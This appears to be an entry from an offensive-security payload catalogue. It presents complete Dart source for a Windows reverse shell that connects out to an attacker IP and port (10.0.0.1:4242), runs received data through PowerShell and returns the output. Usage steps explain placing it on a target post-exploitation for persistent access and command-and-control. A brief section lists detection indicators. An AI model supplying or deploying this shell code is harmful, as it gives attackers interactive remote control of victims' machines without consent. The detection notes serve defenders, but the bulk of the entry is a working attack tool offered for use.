---
type: code
language: dart
verified: true
tags:
  - reverse-shell
  - payload
  - powershell
platforms:
  - Windows
validated: true
---

# Dart-Reverse-PowerShell-Payload

## Code

```dart
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("10.0.0.1", 4242).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```

## Description

This Dart script implements a reverse TCP shell that runs on a Windows target. It connects back to an attacker-specified IP and port, spawns a PowerShell process, forwards received data as commands to PowerShell's stdin, and relays the output back over the socket. This provides interactive remote access without additional dependencies beyond the Dart runtime. It is typically deployed post-initial access for command execution and C2.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| IP in Socket.connect ("10.0.0.1") | Attacker's IP address to connect back to; replace before deployment | 192.168.1.100 |
| Port in Socket.connect (4242) | Attacker's listening port; replace before deployment | 4444 |

## Usage

Save the script as a .dart file on the target (e.g., via upload in an existing shell). Edit the IP and port parameters to match your listener. Execute with 'dart run filename.dart'. Ensure a listener (e.g., Netcat) is running on the attacker side beforehand. Used in post-exploitation for maintaining access on Dart-enabled Windows environments.

## Detection

- Monitor for dart.exe processes spawning powershell.exe or making outbound TCP connections to non-standard ports.
- Network logs showing persistent TCP sessions from scripting processes to external IPs.
- PowerShell execution logs capturing commands from unexpected parents (dart.exe).
- File system monitoring for .dart files in temporary or user directories.

## Related

- [[procedures/Dart-Reverse-PowerShell-Shell]]
